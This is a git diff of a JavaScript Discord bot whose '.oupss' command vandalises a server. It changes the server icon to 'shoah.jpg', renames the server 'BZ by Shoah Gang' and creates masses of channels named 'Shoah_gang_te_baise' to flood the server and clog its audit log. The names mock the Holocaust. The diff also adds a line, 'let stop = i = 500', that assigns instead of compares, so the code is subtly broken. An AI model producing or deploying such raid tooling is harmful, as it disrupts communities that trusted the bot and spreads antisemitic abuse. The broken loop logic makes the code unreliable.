@@ -40,6 +40,7 @@ bot.on('message', msg => {
 
 if (msg.content === '.oupss') {
   console.log(`Commande .oupss par ${msg.author.id}`)
+
   if (!fucked){
     msg.guild.setIcon("shoah.jpg");
     msg.guild.setName('BZ by Shoah Gang');
@@ -48,18 +49,17 @@ if (msg.content === '.oupss') {
 
     for (var i = 0; i < 500; i++) {
 
-      msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch
-      msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch
+      msg.guild.createChannel('Shoah_gang_te_baise', 'voice')
+      msg.guild.createChannel('Shoah_gang_te_baise', 'text')
       //changes name tons of times to clog up the audit log
+
+      let stop = i = 500;
+      if (stop) return;
+      
      
   }
 }
- 
-    if (msg.deletable) {
-      msg.delete();
-    }
-  }
- 
+
   if (msg.content === '.name') {
     msg.delete();
 
